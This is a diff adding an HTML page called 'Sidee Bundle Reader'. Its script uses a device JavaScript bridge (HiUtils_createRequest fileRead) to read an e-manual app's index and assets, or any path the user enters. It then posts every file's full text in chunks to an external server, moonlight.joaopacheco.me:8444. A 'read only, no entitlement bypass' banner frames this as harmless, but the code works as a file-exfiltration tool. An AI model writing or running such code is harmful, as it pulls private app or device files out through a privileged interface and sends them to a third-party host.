@@ -1,0 +1,104 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Sidee Bundle Reader</title>
+<style>
+body{background:#111;color:#eee;font:17px sans-serif;margin:20px}
+h1{font-size:26px}button{font:16px sans-serif;margin:3px 4px;padding:7px 10px}
+input{font:16px sans-serif;width:60vw;padding:7px}
+pre{white-space:pre-wrap;word-break:break-all;background:#000;padding:16px;min-height:170px}
+.ok{color:#7f7}.bad{color:#f77}.warn{color:#fc3}
+</style>
+</head>
+<body>
+<h1>SIDEE BUNDLE READER</h1>
+<p>READ ONLY. LOGS TO EXISTING METRICS PROXY. NO WRITE. NO ENTITLEMENT BYPASS.</p>
+<div>
+<button id="index">1 READ INDEX</button>
+<button id="assets">2 READ ASSETS</button>
+<input id="path" value="emanual/Local_ebook/app.js">
+<button id="one">3 READ PATH</button>
+</div>
+<pre id="out">READY</pre>
+<script>
+var ROOT='emanual/Local_ebook/';
+var LOG='https://moonlight.joaopacheco.me:8444/api/log';
+var assets=[];
+
+function out(s,cls){var d=document.createElement('div');if(cls)d.className=cls;d.textContent=s;document.getElementById('out').appendChild(d);}
+function clear(){document.getElementById('out').textContent='';}
+function ok(s){out('OK '+s,'ok');}
+function bad(s){out('FAIL '+s,'bad');}
+function warn(s){out('NOTE '+s,'warn');}
+function call(api,params){
+  if(typeof HiUtils_createRequest!=='function')throw new Error('HIUTILS MISSING');
+  return HiUtils_createRequest(api,params);
+}
+function isOk(r){return !!(r&&r.ret);}
+function body(r){return (r&&typeof r.msg==='string')?r.msg:null;}
+function post(tag,text){
+  var size=3000;
+  var n=Math.max(1,Math.ceil(text.length/size));
+  for(var i=0;i<n;i++){
+    var chunk=text.slice(i*size,(i+1)*size);
+    try{
+      fetch(LOG,{method:'POST',body:'SIDEE '+tag+' '+i+'/'+n+' '+chunk,mode:'no-cors',keepalive:true});
+    }catch(e){}
+  }
+}
+function readOne(path,tag){
+  var r=call('fileRead',{path:path,mode:6});
+  if(!isOk(r))throw new Error(tag+' READ '+JSON.stringify(r).slice(0,300));
+  var t=body(r);if(t===null)throw new Error(tag+' NO BODY');
+  post(tag,t);
+  ok(tag+' LEN '+t.length);
+  return t;
+}
+function refs(text){
+  var out=[];
+  var re=/(?:src|href)\s*=\s*["']([^"']+)["']/gi;
+  var m;
+  while((m=re.exec(text))!==null){
+    var u=m[1];
+    if(!/^(?:https?:|data:|\/\/|#)/i.test(u))out.push(u);
+  }
+  return out.filter(function(v,i,a){return a.indexOf(v)===i;});
+}
+function abs(ref){
+  if(ref.charAt(0)==='/')return ref.slice(1);
+  return ROOT+ref.replace(/^\.\//,'');
+}
+
+document.getElementById('index').addEventListener('click',function(){
+  clear();assets=[];
+  try{
+    var t=readOne(ROOT+'index.html','INDEX');
+    assets=refs(t).map(abs);
+    ok('ASSETS '+assets.length);
+    assets.forEach(function(p){out('ASSET '+p,'warn');});
+    warn('SEE LOGS FOR FULL TEXT');
+  }catch(e){bad(e.message);}
+});
+
+document.getElementById('assets').addEventListener('click',function(){
+  clear();
+  if(!assets.length){bad('READ INDEX FIRST');return;}
+  assets.forEach(function(p,i){
+    try{readOne(p,'A'+i+'_'+p.split('/').pop());}
+    catch(e){bad(e.message);}
+  });
+  warn('SEE LOGS');
+});
+
+document.getElementById('one').addEventListener('click',function(){
+  clear();
+  var p=document.getElementById('path').value.trim();
+  if(!p){bad('EMPTY PATH');return;}
+  try{readOne(p,'ONE_'+p.split('/').pop());warn('SEE LOGS');}
+  catch(e){bad(e.message);}
+});
+</script>
+</body>
+</html>
